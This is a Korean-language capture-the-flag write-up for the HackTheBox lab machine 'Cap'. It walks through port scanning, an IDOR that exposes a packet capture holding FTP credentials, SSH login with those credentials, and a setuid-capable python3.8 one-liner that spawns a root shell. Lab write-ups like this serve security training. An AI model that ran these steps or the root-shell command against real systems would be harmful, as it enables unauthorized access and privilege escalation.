# Cap - HackTheBox
## Recon
```bash
sudo nmap -p 21,22,80 -sC -sV -vv -oA cap 10.10.10.245
```
<img width="1104" height="433" alt="image" src="https://github.com/user-attachments/assets/99b7b875-0a23-4340-9dfd-0b6c1a0c7e8a" />

- FTP(21)
- SSH(22)
- HTTP(80)

---
## FTP
- `anonymous`로그인을 시도하였으나 실패.

---
## HTTP
### banner grabbing
```bash
whatweb http://10.10.10.245

curl -IL http://10.10.10.245
```
<img width="1104" height="269" alt="image" src="https://github.com/user-attachments/assets/d54a9934-bdd7-48e0-ac07-fc23f0982571" />

<br>
<br>

### PCAP
- `Security Snapshot`탭을 클릭해보면 파일을 다운로드 받을 수 있는 링크로 연결된다.
- 다운로드 받은 파일을 확인해보니 `pcap`파일 확장자이고, `wireshark`로 실행해서 확인해보았으나 아무것도 나오지 않았음.
<img width="1100" height="602" alt="image" src="https://github.com/user-attachments/assets/fba625af-b58c-4696-81ea-8ef3d6b37455" />

<br>
<br>

- url에서 마지막 적혀있는 숫자를 바꿀 수 있는가 시도.(IDOR)
<img width="1100" height="602" alt="image" src="https://github.com/user-attachments/assets/5a12d462-c398-439f-bce9-3a784df78147" />

<br>
<br>

- 다운로드를 받아서 `wireshark`로 확인해보니 `FTP`와 `HTTP`가 기록되어 있었음.
- `FTP`만 필터링해서 확인해보니 `nathan:Buck3tH4TF0RM3!` 계정으로 로그인한 것을 발견.
<img width="1100" height="80" alt="image" src="https://github.com/user-attachments/assets/3849e203-fa2d-444d-a63d-a8cccc004132" />

---
## SSH
- 획득한 계정으로 SSH 접속을 시도.
```bash
ssh nathan@10.10.10.245
```
<img width="1103" height="614" alt="image" src="https://github.com/user-attachments/assets/a6d66946-c676-4f28-b9ff-ffd8b16faf9d" />

---
## Privesc
- `getcap`을 사용해보니 `python3.8`에 `setuid`권한이 설정되어 있음.
```bash
getcap -r / 2>/dev/null
```
<img width="1103" height="117" alt="image" src="https://github.com/user-attachments/assets/f9f8e30e-6ca4-4da3-8a39-7077727bc8ea" />

<br>
<br>

- https://gtfobins.github.io/gtfobins/python/
- `GTFOBIN`을 참조하여 권한 상승 시도.
```bash
/usr/bin/python3.8 -c 'import os;os.setuid(0);os.system("/bin/bash")'
```
<img width="1103" height="62" alt="image" src="https://github.com/user-attachments/assets/355a19ac-a870-4c4c-9599-4c8c9003e1e8" />

---
## FLAG
- `/home/nathan/user.txt`
<img width="1103" height="213" alt="image" src="https://github.com/user-attachments/assets/6c8a6938-5a31-4aa9-a0f6-2e7887f99b7f" />

<br>
<br>

- `/root/root.txt`
<img width="1103" height="251" alt="image" src="https://github.com/user-attachments/assets/8aa405f3-a1cb-45f2-8664-43e72f71d706" />






